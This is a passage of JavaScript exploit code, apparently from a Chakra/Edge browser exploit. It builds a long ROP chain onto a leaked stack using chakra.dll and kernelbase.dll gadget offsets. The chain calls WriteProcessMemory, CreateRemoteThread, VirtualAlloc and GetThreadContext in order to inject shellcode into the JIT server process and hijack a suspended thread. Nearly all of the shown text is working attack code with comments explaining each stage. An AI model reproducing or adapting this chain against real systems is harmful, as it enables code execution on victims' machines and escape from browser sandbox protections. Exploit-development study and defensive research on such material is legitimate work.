write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain (Number 3)
// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// VirtualAlloc() ROP chain
// Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext

// DWORD flProtect (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPVOID lpAddress (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
next();

// SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
next();

// DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
next();

// Call KERNELBASE!VirtualAlloc
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();

// GetThreadContext() ROP chain
// Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack

// First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
// The value we need to set is 0x10001F
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// HANDLE hThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future mov qword [rax+0x20], rcx gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
next();

// LPCONTEXT lpContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
next();                                                                      
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// Call KERNELBASE!GetThreadContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();

// Locate store CONTEXT.Rsp and store it in .data of kernelbase.dll
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we stored CONTEXT.ContextFlags
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x4c37c5, chakraHigh);		// 0x1804c37c5: mov rax, qword [rcx] ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f73a, chakraHigh);       // 0x18026f73a: add rax, 0x68 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118, kernelbaseHigh); // .data section of kernelbase.dll where we want to store CONTEXT.Rsp
next();
